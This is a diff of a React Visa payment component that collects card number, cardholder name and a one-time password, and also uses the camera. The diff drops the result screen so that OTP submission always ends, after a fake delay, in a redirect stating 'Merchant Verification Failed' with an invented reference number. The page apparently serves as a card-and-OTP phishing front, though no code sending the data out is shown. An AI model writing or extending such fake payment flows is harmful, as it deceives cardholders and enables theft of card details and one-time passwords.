@@ -1,6 +1,6 @@
 import { useState, useRef, useEffect, useCallback } from "react";
 import { useNavigate } from "react-router-dom";
-import { CreditCard, Lock, ArrowLeft, CheckCircle, XCircle, Camera, X } from "lucide-react";
+import { CreditCard, Lock, ArrowLeft, Camera, X } from "lucide-react";
 import genzLogo from "@/assets/genz-logo.png";
 import visaLogo from "@/assets/visa-logo.png";
 
@@ -12,8 +12,6 @@ const VisaPayment = () => {
   const [cardHolder, setCardHolder] = useState("");
   const [isFlipped, setIsFlipped] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
-  const [showResult, setShowResult] = useState<'success' | 'failed' | null>(null);
-  const [redirectTimer, setRedirectTimer] = useState(5);
   const [cardVisible, setCardVisible] = useState(false);
   const [showOtp, setShowOtp] = useState(false);
   const [otpCode, setOtpCode] = useState("");
@@ -44,14 +42,6 @@ const VisaPayment = () => {
     return () => clearInterval(interval);
   }, [showOtp, otpTimer]);
 
-  useEffect(() => {
-    let interval: NodeJS.Timeout;
-    if (showResult && redirectTimer > 0) {
-      interval = setInterval(() => setRedirectTimer((p) => p - 1), 1000);
-    }
-    if (showResult && redirectTimer === 0) navigate("/payment-cancelled?channel=Visa Card Payment&reason=Method not Selected&amount=434.00");
-    return () => clearInterval(interval);
-  }, [showResult, redirectTimer, navigate]);
 
   const stopCamera = useCallback(() => {
     if (streamRef.current) {
@@ -160,9 +150,7 @@ const VisaPayment = () => {
     setOtpLoading(true);
     setTimeout(() => {
       setOtpLoading(false);
-      setShowOtp(false);
-      setShowResult("failed");
-      setRedirectTimer(5);
+      navigate("/payment-cancelled?channel=Visa Card Payment&reason=Merchant Verification Failed&amount=434.00&ref=VIS" + Date.now().toString().slice(-8));
     }, 2500);
   };
 
@@ -214,30 +202,6 @@ const VisaPayment = () => {
     );
   }
 
-  if (showResult) {
-    return (
-      <div className="fixed inset-0 bg-gray-100 flex items-center justify-center p-4">
-        <div className="w-full max-w-md bg-white rounded-2xl shadow-lg p-8 flex flex-col items-center animate-scale-in">
-          {showResult === "success" ? (
-            <>
-              <CheckCircle className="w-16 h-16 text-green-500 mb-4" strokeWidth={1.5} />
-              <h2 className="text-xl font-semibold text-gray-800 mb-2">Payment Successful</h2>
-              <p className="text-gray-500 text-sm mb-1">Amount: ৳434</p>
-            </>
-          ) : (
-            <>
-              <XCircle className="w-16 h-16 text-red-500 mb-4" strokeWidth={1.5} />
-              <h2 className="text-xl font-semibold text-gray-800 mb-2">Payment Failed</h2>
-              <p className="text-gray-500 text-sm mb-1">Transaction could not be completed</p>
-            </>
-          )}
-          <p className="text-gray-400 text-xs mt-4">
-            Redirecting to merchant in {redirectTimer}s
-          </p>
-        </div>
-      </div>
-    );
-  }
 
   if (showOtp) {
     return (
